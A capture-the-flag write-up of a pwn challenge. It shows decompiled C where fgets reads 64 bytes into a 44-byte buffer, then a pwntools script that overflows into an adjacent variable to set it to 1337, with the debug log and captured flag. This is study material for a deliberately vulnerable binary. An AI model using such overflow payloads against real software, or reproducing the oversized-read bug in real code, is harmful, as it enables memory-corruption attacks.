# A kind of magic

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+10h] [rbp-30h] BYREF
  unsigned int v5; // [rsp+3Ch] [rbp-4h]

  v5 = 0;
  puts("Is this a kind of magic? What is your magic?: ");
  fflush(_bss_start);
  fgets(s, 64, stdin);
  printf("You entered %s\n", s);
  printf("Your magic is: %d\n", v5);
  fflush(_bss_start);
  if ( v5 == 1337 )
  {
    puts("Whoa we got a magic man here!");
    fflush(_bss_start);
    system("cat flag.txt");
  }
  else
  {
    puts("You need to challenge the doors of time");
    fflush(_bss_start);
  }
  return 0;
}
```

## Analysis
We have a buffer of 44 bytes, but we read 64. After the buffer there is the variable v5
(IDA named it that way), that is initialized with 0 and is never written to afterwards.
But if we overflow the buffer we can write to that variable. If v5 is 1337, we have the flag.

Final script:
```py
from pwn import *
r = remote("143.198.184.186", 5000)
r.clean()
r.sendline(b'A' * 44 + p64(1337))
r.clean()
```

```
[DEBUG] Received 0x2f bytes:
    b'Is this a kind of magic? What is your magic?: \n'
[DEBUG] Received 0x4f bytes:
    00000000  59 6f 75 20  65 6e 74 65  72 65 64 20  41 41 41 41  │You │ente│red │AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  39 05 0a 59  6f 75 72 20  │AAAA│AAAA│9··Y│our │
    00000040  6d 61 67 69  63 20 69 73  3a 20 31 33  33 37 0a     │magi│c is│: 13│37·│
    0000004f
[DEBUG] Received 0x54 bytes:
    b'flag{i_hope_its_still_cool_to_use_1337_for_no_reason}\n'
    b'Whoa we got a magic man here!\n'
```

Final flag: `flag{i_hope_its_still_cool_to_use_1337_for_no_reason}`